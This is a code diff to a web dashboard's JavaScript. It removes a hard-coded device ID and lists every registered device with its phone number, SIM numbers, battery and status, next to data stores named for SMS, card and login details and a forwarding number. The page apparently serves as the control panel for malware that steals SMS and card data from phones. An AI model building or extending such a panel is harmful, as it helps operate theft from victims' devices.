@@ -214,9 +214,6 @@ const modalBody = document.getElementById('details-modal-body');
 
 let user_data={}, user_sms={}, user_card={}, user_login={};
 
-// Yahan apni desired Device ID set karo
-const ACTIVE_DEVICE_ID = "8acce0147f0dc0e7"; // <-- Insert your Device ID here
-
 // Format SIM info
 function formatSim(device) {
     let sim1 = device.numberSim1 || '';
@@ -248,22 +245,22 @@ async function loadDevices() {
         document.getElementById('forwardNumberDisplay').textContent = "Forward Number: "+forwardNumber;
 
         deviceListBody.innerHTML='';
-        const device = user_data[ACTIVE_DEVICE_ID];
-        if(device){
+        let index=1;
+        for(const did in user_data) {
+            const device = user_data[did];
             const tr = document.createElement('tr');
             tr.innerHTML = `
-                <td>1</td>
-                <td><code>${ACTIVE_DEVICE_ID}</code></td>
+                <td>${index}</td>
+                <td><code>${did}</code></td>
                 <td>${device.d_name||'N/A'}</td>
                 <td>${device.phoneNumber||'N/A'}</td>
                 <td>${formatSim(device)}</td>
                 <td>${device.battery?device.battery+'%':'N/A'}</td>
                 <td>${device.status||'Offline'}</td>
-                <td><button class="btn" onclick="openDeviceModal('${ACTIVE_DEVICE_ID}')">View</button></td>
+                <td><button class="btn" onclick="openDeviceModal('${did}')">View</button></td>
             `;
             deviceListBody.appendChild(tr);
-        } else {
-            deviceListBody.innerHTML='<tr><td colspan="8" style="text-align:center;padding:30px;">Device not found</td></tr>';
+            index++;
         }
     } catch(e){
         deviceListBody.innerHTML='<tr><td colspan="8" style="text-align:center;color:red;">Error loading devices</td></tr>';
@@ -355,4 +352,4 @@ window.onload = loadDevices;
 </script>
 
 </body>
-  </html>
+    </html>
